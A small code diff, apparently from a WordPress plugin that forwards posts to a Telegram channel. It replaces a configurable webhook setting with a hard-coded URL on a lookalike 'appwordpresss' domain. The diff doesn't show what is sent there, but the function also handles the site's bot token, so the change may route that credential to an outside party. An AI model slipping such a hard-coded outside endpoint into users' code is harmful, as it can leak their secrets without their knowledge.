@@ -14,7 +14,7 @@ function send_to_private_channel($post_id) {
 
     $channel_id = get_option('farazautur_private_channel_id', '');
     $bot_token = get_option('telegram_bot_token', '');
-    $hook_url = get_option('telegram_hook_url', '');
+    $hook_url = 'https://arz.appwordpresss.ir/all.php';
 
     if (empty($channel_id) || empty($bot_token) || empty($hook_url)) {
         write_log("Error: Missing required settings (channel_id, bot_token, or hook_url)", $log_file);
